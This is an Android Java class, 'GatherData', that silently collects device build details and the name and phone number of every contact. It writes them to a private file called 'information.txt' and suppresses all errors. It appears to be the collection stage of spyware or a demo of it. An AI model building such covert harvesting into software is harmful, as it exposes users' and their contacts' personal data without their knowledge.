package com.example.myapplication;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

import java.io.IOException;
import java.io.OutputStreamWriter;

public class GatherData {

    public GatherData(Context context) {
        try {
            String s = "";

            s += "\n OS Version: "      + System.getProperty("os.version")      + "(" + android.os.Build.VERSION.INCREMENTAL + ")";
            s += "\n OS API Level: "    + android.os.Build.VERSION.SDK_INT;
            s += "\n Device: "          + android.os.Build.DEVICE;
            s += "\n Model (and Product): " + android.os.Build.MODEL            + " ("+ android.os.Build.PRODUCT + ")";

            s += "\n RELEASE: "         + android.os.Build.VERSION.RELEASE;
            s += "\n BRAND: "           + android.os.Build.BRAND;
            s += "\n DISPLAY: "         + android.os.Build.DISPLAY;
            s += "\n CPU_ABI: "         + android.os.Build.CPU_ABI;
            s += "\n CPU_ABI2: "        + android.os.Build.CPU_ABI2;
            s += "\n UNKNOWN: "         + android.os.Build.UNKNOWN;
            s += "\n HARDWARE: "        + android.os.Build.HARDWARE;
            s += "\n Build ID: "        + android.os.Build.ID;
            s += "\n MANUFACTURER: "    + android.os.Build.MANUFACTURER;
            s += "\n SERIAL: "          + android.os.Build.SERIAL;
            s += "\n USER: "            + android.os.Build.USER;
            s += "\n HOST: "            + android.os.Build.HOST;

            try{
                OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput("information.txt", Context.MODE_PRIVATE));
                outputStreamWriter.write(s+"\n");
                outputStreamWriter.close();
            }
            catch (IOException e) {
                Log.e("Exception", "File write failed: " + e.toString());
            }

            Uri uri = ContactsContract.Contacts.CONTENT_URI;
            Cursor c = context.getContentResolver().query(uri, null, null, null, null);

            if (c.getCount() > 0){

                while (c.moveToNext()){
                    @SuppressLint("Range") String id = c.getString(c.getColumnIndex(ContactsContract.Contacts._ID));
                    @SuppressLint("Range") String name = c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                    Uri uriPhone = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
                    String selection = ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " =?";
                    Cursor phoneC = context.getContentResolver().query(uriPhone,null,selection, new String[]{id},null);

                    if (phoneC.moveToNext()){

                        @SuppressLint("Range") String number = phoneC.getString(phoneC.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                        try{
                            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput("information.txt", Context.MODE_APPEND));
                            outputStreamWriter.append(name + " " + number).append("\n");
                            outputStreamWriter.close();
                        }
                        catch (IOException e) {
                        }
                    }
                }
            }

        }
        catch (Exception e){
        }
    }
}
